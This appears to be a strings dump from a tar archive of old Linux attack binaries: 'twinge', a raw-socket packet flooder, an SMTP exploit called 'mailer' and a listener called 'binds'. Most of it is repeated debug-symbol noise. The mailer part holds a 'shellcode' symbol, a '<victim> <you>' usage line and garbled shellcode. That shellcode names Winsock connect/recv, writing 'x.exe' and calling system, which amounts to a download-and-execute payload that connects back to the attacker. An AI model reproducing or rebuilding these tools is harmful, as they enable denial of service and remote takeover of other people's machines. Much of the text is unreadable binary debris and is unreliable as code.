            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "rpk.c",
            "packet.6",
            "lookup",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "real_data",
            "__libc_start_main@@GLIBC_2.0",
            "sendpkt_udp",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/twinge",
            "0100755",
            "0000000",
            "0000000",
            "00000035777",
            "07100656727",
            "013410",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "random",
            "getpid",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "fprintf",
            "strcat",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "memset",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh\u050e",
            "E1fE",
            "fE1fu",
            "e[^]",
            "EEEE",
            "Ej$j",
            "j\tEPH",
            " u$h",
            "U8h\t",
            "\"EPE",
            "E%h ",
            "u#hI",
            "9Ev$E",
            "0EPEPt",
            "PEPEPEP",
            "*EPEPt",
            "PEPEPEP EcE",
            "*EPEPt",
            "PEPEPEP E#j",
            "PEPEPEPl ",
            "\u0403;u[]",
            "twinge.c by sinkhole@dos.org - licensed for use by %s",
            "This is a PoC (Proof of Concept) program for educational uses.",
            "usage: %s <dest> <cycles [0 == continuous]>",
            "ERROR: Unable to resolve host %s",
            "sendto",
            "ERROR: Opening raw socket. (need UID 0)",
            "Cannot resolve destination",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "twinge.c",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "send_packet",
            "_start",
            "resolver",
            "strlen@@GLIBC_2.0",
            "counter",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "strcat@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/mailer",
            "0100755",
            "0000000",
            "0000000",
            "00000034663",
            "07100656632",
            "013350",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "memcpy",
            "perror",
            "socket",
            "bzero",
            "write",
            "inet_addr",
            "__deregister_frame_info",
            "read",
            "htonl",
            "memset",
            "gethostbyname",
            "sprintf",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "strchr",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhT",
            "0\u0689\udbec\udd44P]",
            "\u0403;u[]",
            "usage: %s <victim> <you>",
            "Unable to resolve local hostname.",
            "Can not resolve specified VictimHost.",
            "socket",
            "connect",
            "RCPT TO: %s",
            "X_23\u0271\t",
            "G!G(G0G5GAGGGNGUGXG^GeGjPPw\u0409Gn3\u0271",
            "PPw\u0409Gr",
            "Pwr(n\u040b3\u0271",
            "PW3\u0271",
            "3_3\u0271\"",
            "Pwr(n\u040b3P@P@P\u0589Gv3\u0271",
            "V3\u0271)",
            "Pwr(n\u040b3",
            "Pwv\u058b3\u0271B",
            "Pwn(n\u040b3\u0271V",
            "P3\u0271Y",
            "P\u0589Gz",
            "c3\u02711",
            "Pwr(n\u040b3Pf",
            "Pwv\u0589G~3;t1r/3\u0271H",
            "Pwn(n\u040bwzw~3",
            "Pl3\u02716",
            "Pwr(n\u040bwv\u058b3\u0271O",
            "Pwn(n\u040bwz\u058b3\u0271_",
            "Pwn(n\u040b3\u0271Y",
            "P\u058b3\u0271f",
            "Pwn(n3S\u0410",
            "msvcrt.dll,wsock32.dll,WSAStartup,socket,connect,recv,closesocket,fopen,fwrite,fclose,wb,x.exe,system,exit,,,,",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "mailer.c",
            "strchr@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "shellcode",
            "htonl@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/binds",
            "0100755",
            "0000000",
            "0000000",
            "00000040625",
            "07100656565",
            "013176",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "select",
            "fflush",
            "bzero",
            "accept",
            "write",
            "bind",
            "inet_addr",
            "__deregister_frame_info",
            "read",
            "bcopy",
            "listen",
            "memset",
            "gethostbyname",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh ",
            "1fR)",
            "XuiE",
            "TPEP",
            "6H7D",
            "2D3@",
            ".@/<",
            "*<+\u01c58",
            "1fV88",
            "$Ph\u0424",
            "hueE",
            "dPEPX",
            "P$PEP",
            "dPEPf",
            "P$PEP",
            "EPTPEP",
